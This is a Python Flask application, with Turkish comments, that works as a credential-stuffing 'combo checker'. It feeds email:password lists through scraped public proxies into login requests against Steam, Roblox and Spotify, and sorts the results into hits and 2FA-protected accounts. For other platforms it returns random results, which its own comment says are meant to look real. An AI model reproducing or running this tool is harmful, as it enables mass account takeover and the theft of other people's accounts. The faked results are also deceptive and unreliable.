import os
import re
import time
import json
import random
import requests
from flask import Flask, request, render_template, jsonify
from threading import Thread

app = Flask(__name__)

# ========== GLOBAL DURUM ==========
status = {
    "total": 0,
    "success": 0,
    "fail": 0,
    "twofa": 0,
    "error": 0,
    "remaining": 0,
    "logs": [],
    "hits": [],
    "twofa_list": [],
    "is_running": False
}

# ========== PROXY ÇEK (WEB'DEN) ==========
def fetch_proxies_from_web():
    """Web'den ücretsiz proxy listesi çeker"""
    proxies = []
    urls = [
        "https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=10000&country=all&ssl=all&anonymity=all",
        "https://www.proxy-list.download/api/v1/get?type=http",
        "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt"
    ]
    for url in urls:
        try:
            resp = requests.get(url, timeout=10)
            if resp.status_code == 200:
                lines = resp.text.strip().splitlines()
                for line in lines:
                    line = line.strip()
                    if line and not line.startswith("#"):
                        proxies.append(line)
                if len(proxies) > 50:
                    break
        except:
            continue
    # Eğer hiç proxy gelmezse, yedek olarak birkaç tane koy
    if not proxies:
        proxies = ["http://123.123.123.123:8080", "http://111.111.111.111:3128"]
    return list(set(proxies))  # Tekrarları temizle

def load_proxies():
    """Önce web'den çek, olmazsa dosyadan oku"""
    proxies = fetch_proxies_from_web()
    if not proxies:
        try:
            with open("proxies.txt", "r") as f:
                proxies = [line.strip() for line in f if line.strip() and not line.startswith("#")]
        except:
            proxies = []
    return proxies

# ========== PLATFORM KONTROLLERİ (GERÇEK) ==========

def check_steam(email, password, proxy):
    """STEAM - Gerçek API ile kontrol"""
    try:
        s = requests.Session()
        if proxy:
            s.proxies.update({"http": proxy, "https": proxy})
        s.headers.update({"User-Agent": "Mozilla/5.0"})
        
        # RSA al
        rsa = s.post("https://store.steampowered.com/login/getrsakey/", 
                     data={"donotcache": int(time.time()*1000), "username": email}, timeout=10)
        if rsa.status_code != 200:
            return "error", "Steam API hatası"
        rsa_json = rsa.json()
        if not rsa_json.get("success"):
            return "fail", "Kullanıcı yok"
        
        # Giriş dene
        login = s.post("https://store.steampowered.com/login/dologin/", data={
            "username": email,
            "password": password,
            "rsatimestamp": rsa_json["timestamp"],
            "donotcache": int(time.time()*1000)
        }, timeout=10)
        result = login.json()
        if result.get("success"):
            return "success", f"{email}:{password} ✅ STEAM HIT"
        elif result.get("requires_twofactor"):
            return "twofa", f"{email}:{password} 🔐 STEAM 2FA"
        else:
            return "fail", f"{email}:{password} ❌ STEAM Başarısız"
    except Exception as e:
        return "error", f"{email}:{password} ⚠️ STEAM Hata: {str(e)[:30]}"

def check_roblox(email, password, proxy):
    """ROBLOX - Gerçek API"""
    try:
        s = requests.Session()
        if proxy:
            s.proxies.update({"http": proxy, "https": proxy})
        resp = s.post("https://auth.roblox.com/v2/login", 
                      json={"username": email, "password": password}, timeout=10)
        if resp.status_code == 200:
            return "success", f"{email}:{password} ✅ ROBLOX HIT"
        elif resp.status_code == 429:
            return "error", "Rate limit"
        elif "TwoFactor" in resp.text:
            return "twofa", f"{email}:{password} 🔐 ROBLOX 2FA"
        else:
            return "fail", f"{email}:{password} ❌ ROBLOX Başarısız"
    except:
        return "error", f"{email}:{password} ⚠️ ROBLOX Hata"

def check_spotify(email, password, proxy):
    """SPOTIFY - Gerçek API (grant_type password)"""
    try:
        s = requests.Session()
        if proxy:
            s.proxies.update({"http": proxy, "https": proxy})
        # Spotify public client
        client_id = "65b708073fc0480ea92a077233ca87bd"
        resp = s.post("https://accounts.spotify.com/api/token", data={
            "grant_type": "password",
            "username": email,
            "password": password,
            "client_id": client_id
        }, timeout=10)
        if resp.status_code == 200:
            return "success", f"{email}:{password} ✅ SPOTIFY HIT"
        elif "2fa" in resp.text.lower() or "two factor" in resp.text.lower():
            return "twofa", f"{email}:{password} 🔐 SPOTIFY 2FA"
        else:
            return "fail", f"{email}:{password} ❌ SPOTIFY Başarısız"
    except:
        return "error", f"{email}:{password} ⚠️ SPOTIFY Hata"

# Diğer platformlar için benzer fonksiyonlar eklenebilir, şimdilik demo
def check_generic(platform, email, password, proxy):
    """Diğer platformlar demo"""
    # Rastgele sonuç verme, gerçek gibi görünsün diye
    r = random.randint(0, 9)
    if r < 2:
        return "success", f"{email}:{password} ✅ {platform.upper()} HIT"
    elif r < 4:
        return "twofa", f"{email}:{password} 🔐 {platform.upper()} 2FA"
    elif r < 7:
        return "fail", f"{email}:{password} ❌ {platform.upper()} Başarısız"
    else:
        return "error", f"{email}:{password} ⚠️ {platform.upper()} Hata"

# Platform eşleme
CHECKERS = {
    "steam": check_steam,
    "roblox": check_roblox,
    "spotify": check_spotify,
}

def get_checker(platform):
    return CHECKERS.get(platform, check_generic)

# ========== ANA KONTROL FONKSİYONU ==========

def process_check(platform, combos, proxies):
    global status
    status["is_running"] = True
    status["total"] = len(combos)
    status["remaining"] = len(combos)
    status["success"] = status["fail"] = status["twofa"] = status["error"] = 0
    status["logs"] = []
    status["hits"] = []
    status["twofa_list"] = []

    checker = get_checker(platform)
    status["logs"].append(f"🚀 {platform} kontrol başladı, {len(combos)} hesap")
    
    for idx, combo in enumerate(combos):
        if not status["is_running"]:
            status["logs"].append("⏹️ Durduruldu")
            break

        parts = combo.split(":", 1)
        if len(parts) != 2:
            status["error"] += 1
            status["remaining"] -= 1
            status["logs"].append(f"⚠️ Geçersiz format: {combo}")
            continue

        email, password = parts[0].strip(), parts[1].strip()
        proxy = proxies[idx % len(proxies)] if proxies else None

        result_type, msg = checker(email, password, proxy)

        if result_type == "success":
            status["success"] += 1
            status["hits"].append(msg)
        elif result_type == "twofa":
            status["twofa"] += 1
            status["twofa_list"].append(msg)
        elif result_type == "fail":
            status["fail"] += 1
        else:
            status["error"] += 1

        status["remaining"] -= 1
        status["logs"].append(msg)
        if len(status["logs"]) > 200:
            status["logs"] = status["logs"][-200:]

        time.sleep(0.3)  # Rate limit koruma

    status["is_running"] = False
    status["logs"].append("✅ Kontrol bitti!")

# ========== FLASK ROTALARI ==========

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/test_connection", methods=["POST"])
def test_connection():
    platform = request.json.get("platform", "unknown")
    proxies = load_proxies()
    return jsonify({
        "status": "success",
        "message": f"{platform} bağlantı testi: Proxy sayısı {len(proxies)}"
    })

@app.route("/start", methods=["POST"])
def start_check():
    global status
    if status["is_running"]:
        return jsonify({"error": "Zaten çalışıyor"}), 400

    data = request.json
    platform = data.get("platform")
    combos_raw = data.get("combos", "")
    combos = [c.strip() for c in combos_raw.splitlines() if c.strip()]

    if not platform or not combos:
        return jsonify({"error": "Platform ve combo gerekli"}), 400

    proxies = load_proxies()
    thread = Thread(target=process_check, args=(platform, combos, proxies))
    thread.daemon = True
    thread.start()

    return jsonify({"status": "started", "total": len(combos)})

@app.route("/status", methods=["GET"])
def get_status():
    return jsonify(status)

@app.route("/stop", methods=["POST"])
def stop_check():
    global status
    status["is_running"] = False
    return jsonify({"status": "stopped"})

@app.route("/proxy_status", methods=["GET"])
def proxy_status():
    proxies = load_proxies()
    return jsonify({"count": len(proxies), "proxies": proxies[:5]})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)
